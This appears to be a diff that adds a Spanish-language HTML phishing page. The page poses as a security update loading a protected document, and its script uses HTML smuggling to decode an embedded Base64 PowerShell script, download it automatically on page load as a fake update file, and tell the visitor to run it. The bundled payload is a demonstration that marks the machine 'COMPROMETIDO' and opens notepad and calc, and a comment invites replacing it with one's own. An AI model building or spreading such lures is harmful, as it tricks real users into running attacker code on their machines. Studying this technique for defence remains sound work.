@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Cargando documento...</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background: #f0f0f0; }
+        .container { background: white; padding: 30px; border-radius: 10px; max-width: 500px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        h2 { color: #d32f2f; }
+        p { color: #555; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>Actualización de seguridad</h2>
+    <p>Preparando el entorno para visualizar el documento protegido. Por favor espere...</p>
+    <p id="status">Iniciando...</p>
+</div>
+<script>
+    // HTML Smuggling manual: descarga automática del payload
+    function downloadPayload() {
+        // El payload en Base64 (reemplazar con el tuyo)
+        var b64 = "IyBldmlsLnBzMSAtIFNjcmlwdCBkZW1vc3RyYXRpdm8gcGFyYSBlbCBwcm95ZWN0bw0KIyBFc3RlIHNjcmlwdCBzZSBlamVjdXRhcsOhIGVuIGxhIG3DoXF1aW5hIHbDrWN0aW1hIChlbnRvcm5vIGNvbnRyb2xhZG8pDQoNCiMgMS4gTW9zdHJhciB1biBtZW5zYWplIGVtZXJnZW50ZSBjb24gdMOtdHVsbyBsbGFtYXRpdm8NCkFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCltTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94XTo6U2hvdygnwqFFamVjdWNpw7NuIGV4aXRvc2EhIEVsIFBERiBoYSBkZXNlbmNhZGVuYWRvIGVzdGUgc2NyaXB0LicsICdBbGVydGEgZGUgU2VndXJpZGFkIC0gUHJveWVjdG8gRWR1Y2F0aXZvJykNCg0KIyAyLiBDcmVhciB1biBhcmNoaXZvIGRlIHBydWViYSBlbiBlbCBlc2NyaXRvcmlvDQokZGVza3RvcCA9IFtFbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoIkRlc2t0b3AiKQ0KJHByb29mRmlsZSA9ICIkZGVza3RvcFxDT01QUk9NRVRJRE8udHh0Ig0KJGZlY2hhID0gR2V0LURhdGUgLUZvcm1hdCAiZGQvTU0veXl5eSBISDptbTpzcyINCiJFc3RlIGVxdWlwbyBmdWUgY29tcHJvbWV0aWRvIGRlc2RlIHVuIFBERiBlbCBkw61hICRmZWNoYS4gRXN0ZSBhcmNoaXZvIGVzIHVuYSBwcnVlYmEgZGUgY29uY2VwdG8uIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAkcHJvb2ZGaWxlDQoNCiMgMy4gT3BjaW9uYWw6IEFicmlyIGVsIEJsb2MgZGUgbm90YXMgY29uIGVsIGNvbnRlbmlkbyBkZWwgYXJjaGl2byBjcmVhZG8gKG9wY2lvbmFsKQ0KU3RhcnQtUHJvY2VzcyBub3RlcGFkLmV4ZSAtQXJndW1lbnRMaXN0ICRwcm9vZkZpbGUNCg0KIyA0LiBPcGNpb25hbDogQWJyaXIgbGEgY2FsY3VsYWRvcmEgcGFyYSBkZW1vc3RyYXIgZWplY3VjacOzbiAoZGVzY29tZW50YXIgc2kgc2UgZGVzZWEpDQpTdGFydC1Qcm9jZXNzIGNhbGMuZXhlDQoNCiMgTWVuc2FqZSBlbiBjb25zb2xhIChzb2xvIHZpc2libGUgc2kgc2UgZWplY3V0YSBQb3dlclNoZWxsIGVuIG1vZG8gdmlzaWJsZSkNCldyaXRlLUhvc3QgIlBheWxvYWQgZWplY3V0YWRvIGNvcnJlY3RhbWVudGUuIEFyY2hpdm8gY3JlYWRvIGVuOiAkcHJvb2ZGaWxlIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVu";  
+
+        try {
+            // Decodificar Base64 a bytes
+            var byteCharacters = atob(b64);
+            var byteNumbers = new Array(byteCharacters.length);
+            for (var i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            var byteArray = new Uint8Array(byteNumbers);
+            // Crear blob y forzar descarga
+            var blob = new Blob([byteArray], {type: "application/octet-stream"});
+            var link = document.createElement("a");
+            link.href = URL.createObjectURL(blob);
+            link.download = "documento_actualizacion.ps1";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(link.href);
+            document.getElementById("status").innerHTML = "Descarga completada. Ejecute el archivo descargado para completar la instalación.";
+        } catch(e) {
+            document.getElementById("status").innerHTML = "Error: No se pudo iniciar la descarga. <a href='#' onclick='downloadPayload(); return false;'>Haga clic aquí</a> para intentarlo de nuevo.";
+        }
+    }
+
+    // Iniciar la descarga automáticamente al cargar la página
+    window.onload = function() {
+        setTimeout(downloadPayload, 1000); // Pequeña pausa para que el usuario vea el mensaje
+    };
+</script>
+</body>
+</html>
